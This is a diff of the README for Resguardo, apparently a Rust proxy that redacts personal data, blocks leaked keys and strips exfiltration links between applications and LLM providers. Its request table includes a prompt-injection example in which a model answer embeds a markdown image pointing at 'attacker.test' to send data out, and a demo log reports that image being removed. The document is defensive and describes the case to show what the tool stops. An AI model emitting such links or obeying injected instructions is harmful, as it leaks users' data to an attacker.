@@ -9,14 +9,16 @@
   <a href="LICENSE"><img alt="License: Apache-2.0" src="https://img.shields.io/badge/license-Apache--2.0-blue.svg"></a>
   <img alt="Rust 2024 edition" src="https://img.shields.io/badge/rust-2024_edition-orange.svg">
   <img alt="unsafe: forbidden" src="https://img.shields.io/badge/unsafe-forbidden-success.svg">
-  <img alt="Status: pre-alpha" src="https://img.shields.io/badge/status-pre--alpha-lightgrey.svg">
+  <img alt="Status: v0.1 preview" src="https://img.shields.io/badge/status-v0.1_preview-yellow.svg">
 </p>
 
 <p align="center">
   <a href="docs/GETTING_STARTED.md">Getting started</a> ·
-  <a href="docs/ARCHITECTURE.md">Architecture</a> ·
+  <a href="#see-it-stop-an-exfiltration">Demo</a> ·
+  <a href="docs/ACCURACY.md">Accuracy</a> ·
+  <a href="docs/DEPLOYMENT.md">Deployment</a> ·
   <a href="docs/THREAT_MODEL.md">Threat model</a> ·
-  <a href="#roadmap">Roadmap</a>
+  <a href="docs/ARCHITECTURE.md">Architecture</a>
 </p>
 
 ---
@@ -65,7 +67,25 @@ client.chat.completions.create(
 )
 ```
 
-The provider receives `Mi DNI es [REDACTED:es_id:1]`, and a signed receipt records the decision. `resguardo verify-log` checks every receipt with the public key.
+The provider receives `Mi DNI es [REDACTED:es_id:1]`, and a signed receipt records the decision.
+
+## What happens to a request
+
+| The application sends… | Resguardo… | The receipt says |
+| --- | --- | --- |
+| `hola, ¿cómo va mi pedido 12345678?` | forwards it byte for byte | `allow` |
+| `Mi DNI es 12345678Z` | forwards `Mi DNI es [REDACTED:es_id:1]` | `redact`, `{"es_id": 1}` |
+| `my key is AKIA…` | answers `403 SENSITIVE_DATA`; nothing leaves | `block`, `secret` |
+| a model that is not on the key's list | answers `403 MODEL_NOT_ALLOWED`; nothing leaves | `block` |
+| anything, while the disk is full | answers `503 AUDIT_UNAVAILABLE`; nothing leaves | — |
+
+| The model answers… | The application gets… |
+| --- | --- |
+| `Done ![x](https://attacker.test/?d=…)`, after a prompt injection | `Done [image removed]` |
+| `[docs](https://unknown.test/…)` | `docs`; links to hosts on the allowlist stay |
+| a provider key, split across two stream events | the stream cut with an error event |
+
+Every decision is a line in a hash-chained, signed log. `resguardo verify-log` checks it with the public key, and the log never holds prompt content.
 
 ## Try it
 
@@ -87,21 +107,29 @@ ok   audit log verifies: OK (30 entries)
 
 One command starts a mock provider and Resguardo, then calls them with the official OpenAI and Anthropic SDKs. It needs Rust, a C compiler and [uv](https://docs.astral.sh/uv/). No API key is needed, and no real provider is contacted. For a step-by-step walkthrough, see [Getting started](docs/GETTING_STARTED.md).
 
-### See it stop an exfiltration
+## See it stop an exfiltration
 
-The [lab](lab/README.md) runs the same attack twice with Docker: from an application on a network that can only reach Resguardo, and from the same application with direct internet access.
+[`lab/local-demo.sh`](lab/local-demo.sh) runs the same attack twice on your machine: through a real `resguardo run`, and straight to the provider. This is its actual output:
 
 ```console
-$ docker compose -f lab/docker-compose.yml run --rm app
-ok   the application cannot reach the attacker directly
+$ lab/local-demo.sh
+== target: http://127.0.0.1:18788
+--   network isolation not checked here (it needs the Docker lab)
 ok   a provider key in the prompt is blocked
 ok   the DNI reached the provider as [REDACTED:es_id:1]
 ok   the image pointing at the attacker was removed from the answer
-$ docker compose -f lab/docker-compose.yml --profile unprotected run --rm app-unprotected
-LEAK the application reached the attacker directly
+
+== target: http://127.0.0.1:19100
+--   network isolation not checked here (it needs the Docker lab)
 LEAK a provider key in the prompt reached the provider
-...
+LEAK the DNI reached the provider as written
+LEAK the answer carries an image that sends data to the attacker
+
+== receipts
+audit.jsonl: OK (6 entries)
 ```
+
+The [Docker lab](lab/README.md) adds what a laptop cannot show: the application sits on a network whose only way out is Resguardo, and the attacker logs what reaches it. It has not been run for this release yet.
 
 ## Accuracy and cost
 
@@ -139,7 +167,9 @@ What it does not do: load balancing, fallbacks, caching, budgets, dashboards, em
 | M3 | Spanish ids, IBAN, cards, phones and email; policy and redaction | ✅ |
 | M4 | Streaming, response scanning, image and link controls, fuzzing | ✅ |
 | M5 | Signed audit log, `resguardo init` and `resguardo verify-log` | ✅ |
-| M6 | Accuracy corpus, benchmark, exfiltration lab, deployment guide and release | 🚧 lab run and v0.1.0 tag pending |
+| M6 | Accuracy corpus, benchmark, exfiltration lab, deployment guide and release | 🚧 Docker lab run and v0.1.0 tag pending |
+
+Next, in v0.2: model-based detectors for unstructured personal data, MCP traffic, workload identity (mTLS, SPIFFE), and timestamped, externally anchored receipts.
 
 ## Limits
 
